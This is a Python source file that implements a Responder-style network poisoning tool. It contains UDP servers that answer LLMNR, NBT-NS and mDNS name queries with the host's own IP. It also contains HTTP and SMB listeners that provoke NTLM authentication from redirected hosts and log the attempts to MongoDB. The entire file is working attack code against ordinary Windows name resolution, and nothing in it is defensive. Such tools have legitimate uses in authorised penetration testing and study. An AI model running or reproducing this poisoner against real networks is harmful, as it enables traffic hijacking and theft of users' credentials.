import socket
import threading
import logging
import struct
import dns.resolver
import platform
import subprocess
import json
import psutil
from datetime import datetime
from socketserver import ThreadingMixIn, UDPServer, TCPServer, BaseRequestHandler
from src.modules.storage.models import Plugin, Resultat

class LLMNRPoisoner(ThreadingMixIn, UDPServer):
    def __init__(self, server_address, responder):
        self.responder = responder
        self.allow_reuse_address = True  # Enable address reuse
        UDPServer.__init__(self, server_address, LLMNRRequestHandler)
        # Set up socket for multicast
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        # Join LLMNR multicast group
        if '0.0.0.0' in server_address:
            mreq = struct.pack("4s4s", socket.inet_aton('224.0.0.252'),
                             socket.inet_aton('0.0.0.0'))
            self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        
class NBTNSPoisoner(ThreadingMixIn, UDPServer):
    def __init__(self, server_address, responder):
        self.responder = responder
        self.allow_reuse_address = True  # Enable address reuse
        UDPServer.__init__(self, server_address, NBTNSRequestHandler)
        # Set up socket for broadcast
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

class MDNSPoisoner(ThreadingMixIn, UDPServer):
    def __init__(self, server_address, responder):
        self.responder = responder
        self.allow_reuse_address = True  # Enable address reuse
        UDPServer.__init__(self, server_address, MDNSRequestHandler)
        # Set up socket for multicast
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        # Join MDNS multicast group
        if '0.0.0.0' in server_address:
            mreq = struct.pack("4s4s", socket.inet_aton('224.0.0.251'),
                             socket.inet_aton('0.0.0.0'))
            self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

class ResponderCapture:
    def __init__(self, interface="0.0.0.0", 
                 poisoning_ports={'llmnr': 5355, 'nbt-ns': 137, 'mdns': 5353},
                 auth_ports={'http': 8080, 'smb': 8445}):
        self.logger = logging.getLogger(__name__)
        self.poisoning_ports = poisoning_ports
        self.auth_ports = auth_ports
        self.running = False
        self.servers = []
        
        # Initialize MongoDB handler only
        from src.utils.mongo_handler import MongoDBHandler
        self.mongo_handler = MongoDBHandler()
        
        # Handle interface name resolution
        self.interface = self._resolve_interface(interface)
            
    def _resolve_interface(self, interface):
        """Resolve interface name to IP address, handling different platforms"""
        if interface == "0.0.0.0":
            return self._get_interface_ip() # Use the auto-detect method

        try:
            if platform.system() == 'Windows':
                # Get interfaces using PowerShell - Corrected quotes around 'Up'
                cmd = 'powershell -Command "Get-NetAdapter | Where-Object {$_.Status -eq \'Up\'} | Select-Object Name,InterfaceDescription | ConvertTo-Json"'
                result = subprocess.run(cmd, capture_output=True, text=True, check=True)
                interfaces = json.loads(result.stdout)
                if isinstance(interfaces, dict): interfaces = [interfaces]
                        
                # Try to match by name or description
                for iface in interfaces:
                    if (interface.lower() in iface['Name'].lower() or 
                        (iface['InterfaceDescription'] and interface.lower() in iface['InterfaceDescription'].lower())):
                        # Get IP address for this interface
                        ip_cmd = f"powershell -Command \"(Get-NetIPAddress -InterfaceAlias '{iface['Name']}' -AddressFamily IPv4).IPAddress\""
                        ip_result = subprocess.run(ip_cmd, capture_output=True, text=True)
                        if ip_result.returncode == 0 and ip_result.stdout.strip():
                            ips = ip_result.stdout.strip().split('\n')
                            for ip in ips:
                                ip = ip.strip()
                                if ip and not ip.startswith('169.254.'): # Filter out APIPA
                                    self.logger.info(f"Resolved interface '{interface}' to IP: {ip}")
                                    return ip
                            self.logger.warning(f"Could not find a non-APIPA IPv4 address for interface '{interface}'. Found: {ips}")
                        else:
                             self.logger.warning(f"Could not retrieve IP address for interface '{iface['Name']}'")
                
                self.logger.error(f"Could not resolve Windows interface name '{interface}' to a valid IP address.")
                return "0.0.0.0" # Fallback

            else: # Linux/macOS
                addrs = psutil.net_if_addrs()
                if interface in addrs:
                    for addr in addrs[interface]:
                        if addr.family == socket.AF_INET: # Found IPv4 address
                            ip = addr.address
                            if not ip.startswith('169.254.'): # Ignore APIPA
                                self.logger.info(f"Resolved interface '{interface}' to IP: {ip}")
                                return ip
                            else:
                                self.logger.warning(f"Interface '{interface}' has APIPA address: {ip}. Skipping.")
                    # If loop finishes without finding a suitable IP:
                    self.logger.error(f"Could not find a suitable IPv4 address for interface '{interface}'. Falling back.")
                    # return "0.0.0.0" # Fallback if only APIPA or no IPv4 found # <-- Changed Line
                    return self._get_interface_ip() # Try auto-detect as fallback
                else:
                    self.logger.error(f"Interface '{interface}' not found by psutil. Falling back.")
                    # Attempt to use the name directly as a last resort, might be an IP already
                    # self.logger.warning(f"Attempting to use '{interface}' directly.") # <-- Removed Line
                    # return interface # <-- Removed Line
                    return self._get_interface_ip() # Try auto-detect as fallback

        except Exception as e:
            self.logger.error(f"Error resolving interface '{interface}': {e}")
            return "0.0.0.0" # Fallback on any error

    def _get_interface_ip(self):
        """Get the first available non-loopback, non-APIPA IP address"""
        try:
            if platform.system() == 'Windows':
                # Use PowerShell to get the first active interface's IP - Corrected quotes around '*Loopback*' and '169.254.*'
                cmd = 'powershell -Command "Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike \'*Loopback*\' -and $_.IPAddress -notlike \'169.254.*\' } | Select-Object -First 1 -ExpandProperty IPAddress"'
                result = subprocess.run(cmd, capture_output=True, text=True)
                if result.returncode == 0 and result.stdout.strip():
                    ip = result.stdout.strip()
                    self.logger.info(f"Auto-detected non-APIPA IP: {ip}")
                    return ip
                else:
                    self.logger.warning("Could not auto-detect a non-APIPA IP via PowerShell.")

            else: # Linux/macOS using psutil
                best_ip = None
                interfaces = psutil.net_if_addrs()
                for if_name, addrs in interfaces.items():
                    if "loopback" in if_name.lower() or "lo" == if_name.lower():
                        continue
                    for addr in addrs:
                        if addr.family == socket.AF_INET:
                            ip = addr.address
                            if not ip.startswith('169.254.'):
                                self.logger.info(f"Auto-detected potential IP {ip} on interface {if_name}")
                                # Prefer non-localhost IPs if possible
                                if not ip.startswith('127.'):
                                    return ip 
                                if best_ip is None: # Store the first valid one found (might be 127.x)
                                    best_ip = ip
                if best_ip:
                    self.logger.info(f"Using auto-detected IP: {best_ip}")
                    return best_ip
                self.logger.warning("Could not auto-detect a suitable IP via psutil.")


            # Fallback method for all platforms if others fail
            self.logger.info("Attempting fallback IP detection via socket connection...")
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(0.1) # Avoid long hangs
            s.connect(('8.8.8.8', 80)) # Doesn't actually send data
            ip = s.getsockname()[0]
            s.close()
            if ip and not ip.startswith('169.254.'):
                 self.logger.info(f"Auto-detected IP via socket: {ip}") # Corrected string termination
                 return ip
            else:
                self.logger.warning(f"Socket method returned APIPA or invalid address: {ip}. Falling back to 0.0.0.0")
                return "0.0.0.0"

        except Exception as e:
            self.logger.error(f"Failed to get interface IP: {e}. Falling back to 0.0.0.0")
            return "0.0.0.0"

    def start_poisoning(self):
        """Start all poisoning and authentication servers"""
        try:
            # Start poisoning servers - bind UDP servers to 0.0.0.0
            llmnr_server = LLMNRPoisoner(('0.0.0.0', self.poisoning_ports['llmnr']), self)
            llmnr_thread = threading.Thread(target=llmnr_server.serve_forever)
            llmnr_thread.daemon = True
            llmnr_thread.start()
            self.servers.append(llmnr_server)
            
            nbtns_server = NBTNSPoisoner(('0.0.0.0', self.poisoning_ports['nbt-ns']), self)
            nbtns_thread = threading.Thread(target=nbtns_server.serve_forever)
            nbtns_thread.daemon = True
            nbtns_thread.start()
            self.servers.append(nbtns_server)
            
            mdns_server = MDNSPoisoner(('0.0.0.0', self.poisoning_ports['mdns']), self)
            mdns_thread = threading.Thread(target=mdns_server.serve_forever)
            mdns_thread.daemon = True
            mdns_thread.start()
            self.servers.append(mdns_server)
            
            # Start HTTP server for capturing auth - bind to specific interface
            http_server = HTTPServer((self.interface, self.auth_ports['http']), self)
            http_thread = threading.Thread(target=http_server.serve_forever)
            http_thread.daemon = True
            http_thread.start()
            self.servers.append(http_server)
            
            # Start SMB server for capturing auth - bind to specific interface
            smb_server = SMBServer((self.interface, self.auth_ports['smb']), self)
            smb_thread = threading.Thread(target=smb_server.serve_forever)
            smb_thread.daemon = True
            smb_thread.start()
            self.servers.append(smb_server)
            
            self.running = True
            self.logger.info(f"UDP poisoning servers listening on 0.0.0.0, will respond with {self.interface}")
            
        except Exception as e:
            self.logger.error(f"Error starting servers: {e}")
            self.stop_poisoning()

    def stop_poisoning(self):
        """Stop all poisoning servers"""
        self.running = False
        for server in self.servers:
            server.shutdown()
            server.server_close()
        self.servers = []
        self.logger.info("All poisoning servers stopped")

    def handle_poisoned_request(self, request_type, source_ip, request_name):
        """Handle poisoned requests and store them in MongoDB"""
        try:
            self.logger.info(f"Received {request_type} request from {source_ip} for name {request_name}")
            
            # Store in MongoDB
            capture_data = {
                'type': request_type,
                'source': source_ip,
                'request_name': request_name,
                'interface': self.interface,
                'timestamp': datetime.now()
            }
            capture_id = self.mongo_handler.store_capture(capture_data)
            
            if capture_id:
                self.logger.debug(f"Successfully stored capture with ID: {capture_id}")
                
                # Store result
                result_data = {
                    'capture_id': capture_id,
                    'timestamp': datetime.now(),
                    'status': 'SUCCESS',
                    'details': f'{request_type} request poisoned successfully'
                }
                result_id = self.mongo_handler.store_result(result_data)
                
                if result_id:
                    self.logger.debug(f"Successfully stored result with ID: {result_id}")
                else:
                    self.logger.warning("Failed to store result in MongoDB")
            else:
                self.logger.warning("Failed to store capture in MongoDB")
                
        except Exception as e:
            self.logger.error(f"Error handling poisoned request: {e}")

    def get_response_ip(self):
        """Get the IP address to use in poisoned responses"""
        return self.interface

class HTTPServer(ThreadingMixIn, TCPServer):
    def __init__(self, server_address, responder):
        self.responder = responder
        TCPServer.__init__(self, server_address, HTTPRequestHandler)
        
class SMBServer(ThreadingMixIn, TCPServer):
    def __init__(self, server_address, responder):
        self.responder = responder
        TCPServer.__init__(self, server_address, SMBRequestHandler)

class LLMNRRequestHandler(BaseRequestHandler):
    def handle(self):
        """Handle LLMNR query and send poisoned response"""
        self.server.responder.logger.debug(f"LLMNRRequestHandler: Received data from {self.client_address}")
        try:
            data, sock = self.request
            self.server.responder.logger.debug(f"LLMNRRequestHandler: Data length: {len(data)}")
            
            if data[2:4] == b'\x00\x00':  # Query packet
                # Get query details
                name_length = struct.unpack('!B', data[12:13])[0]
                query_name = data[13:13 + name_length].decode('utf-8')
                
                # Log the request
                self.server.responder.handle_poisoned_request('LLMNR', self.client_address[0], query_name)
                
                # Create response
                response = (
                    data[:2] +  # Transaction ID
                    b'\x80\x00' +  # Flags (response + authoritative)
                    b'\x00\x01' +  # Questions
                    b'\x00\x01' +  # Answer RRs
                    b'\x00\x00' +  # Authority RRs
                    b'\x00\x00' +  # Additional RRs
                    data[12:13+name_length+1] +  # Original query
                    b'\x00\x01' +  # Type (A)
                    b'\x00\x01' +  # Class (IN)
                    b'\x00\x00\x00\x1e' +  # TTL (30 seconds)
                    b'\x00\x04' +  # Data length
                    socket.inet_aton(self.server.responder.get_response_ip())  # Our IP
                )
                
                # Send response
                sock.sendto(response, self.client_address)
                
        except Exception as e:
            self.server.responder.logger.error(f"Error in LLMNR handler: {e}")
            
class NBTNSRequestHandler(BaseRequestHandler):
    def handle(self):
        """Handle NBT-NS query and send poisoned response"""
        self.server.responder.logger.debug(f"NBTNSRequestHandler: Received data from {self.client_address}")
        try:
            data, sock = self.request
            self.server.responder.logger.debug(f"NBTNSRequestHandler: Data length: {len(data)}")
            
            if data[2:4] == b'\x01\x10':  # Name query packet
                # Get query details
                query_name = data[13:45].decode('ascii').strip()
                
                # Log the request
                self.server.responder.handle_poisoned_request('NBT-NS', self.client_address[0], query_name)
                
                # Create response
                response = (
                    data[:2] +  # Transaction ID
                    b'\x85\x00' +  # Flags (response + authoritative)
                    b'\x00\x00' +  # Questions
                    b'\x00\x01' +  # Answer RRs
                    b'\x00\x00' +  # Authority RRs
                    b'\x00\x00' +  # Additional RRs
                    data[12:45] +  # Original query
                    b'\x00\x20' +  # Type (NB)
                    b'\x00\x01' +  # Class (IN)
                    b'\x00\x00\x00\x1e' +  # TTL (30 seconds)
                    b'\x00\x04' +  # Data length
                    socket.inet_aton(self.server.responder.get_response_ip())  # Our IP
                )
                
                # Send response
                sock.sendto(response, self.client_address)
                
        except Exception as e:
            self.server.responder.logger.error(f"Error in NBT-NS handler: {e}")
            
class MDNSRequestHandler(BaseRequestHandler):
    def handle(self):
        """Handle MDNS query and send poisoned response"""
        self.server.responder.logger.debug(f"MDNSRequestHandler: Received data from {self.client_address}")
        try:
            data, sock = self.request
            self.server.responder.logger.debug(f"MDNSRequestHandler: Data length: {len(data)}")
            
            if data[2:4] == b'\x00\x00':  # Query packet
                # Get query details
                query_name = data[12:].split(b'\x00')[0].decode('utf-8')
                
                # Log the request
                self.server.responder.handle_poisoned_request('MDNS', self.client_address[0], query_name)
                
                # Create response
                response = (
                    data[:2] +  # Transaction ID
                    b'\x84\x00' +  # Flags (response + authoritative)
                    b'\x00\x00' +  # Questions
                    b'\x00\x01' +  # Answer RRs
                    b'\x00\x00' +  # Authority RRs
                    b'\x00\x00' +  # Additional RRs
                    data[12:] +  # Original query
                    b'\x00\x01' +  # Type (A)
                    b'\x00\x01' +  # Class (IN)
                    b'\x00\x00\x00\x1e' +  # TTL (30 seconds)
                    b'\x00\x04' +  # Data length
                    socket.inet_aton(self.server.responder.get_response_ip())  # Our IP
                )
                
                # Send response
                sock.sendto(response, self.client_address)
                
        except Exception as e:
            self.server.responder.logger.error(f"Error in MDNS handler: {e}")

class HTTPRequestHandler(BaseRequestHandler):
    def handle(self):
        """Handle HTTP request and capture NTLM authentication"""
        try:
            data = self.request.recv(4096)
            if b'NTLMSSP' in data:
                self.server.responder.logger.info(f"Received HTTP NTLM auth from {self.client_address[0]}")
                # Send 401 to trigger NTLM auth
                response = (
                    b'HTTP/1.1 401 Unauthorized\r\n'
                    b'WWW-Authenticate: NTLM\r\n'
                    b'Content-Length: 0\r\n'
                    b'Connection: close\r\n\r\n'
                )
                self.request.sendall(response)
                
                # Receive and process NTLM auth
                auth_data = self.request.recv(4096)
                if auth_data and b'NTLMSSP' in auth_data:
                    self.server.responder.handle_poisoned_request(
                        'HTTP', self.client_address[0], 'HTTP NTLM Auth')
        except Exception as e:
            self.server.responder.logger.error(f"Error in HTTP handler: {e}")

class SMBRequestHandler(BaseRequestHandler):
    def handle(self):
        """Handle SMB request and capture NTLM authentication"""
        try:
            data = self.request.recv(4096)
            if b'\xffSMB' in data:  # SMB protocol signature
                self.server.responder.logger.info(f"Received SMB connection from {self.client_address[0]}")
                # Send SMB negotiate response
                response = (
                    b'\x00\x00\x00\x85'  # NetBIOS
                    b'\xffSMB'  # SMB signature
                    b'\x72'  # Negotiate Protocol
                    b'\x00\x00\x00\x00'  # Status: SUCCESS
                    b'\x18\x53\xc0'  # Flags
                    b'\x00\x00'  # Process ID High
                    b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Signature
                    b'\x00\x00'  # Reserved
                    b'\x00\x00'  # Tree ID
                    b'\xff\xfe'  # Process ID
                    b'\x00\x00'  # User ID
                    b'\x00\x00'  # Multiplex ID
                )
                self.request.sendall(response)
                
                # Receive and process NTLM auth
                auth_data = self.request.recv(4096)
                if auth_data and b'NTLMSSP' in auth_data:
                    self.server.responder.handle_poisoned_request(
                        'SMB', self.client_address[0], 'SMB NTLM Auth')
        except Exception as e:
            self.server.responder.logger.error(f"Error in SMB handler: {e}")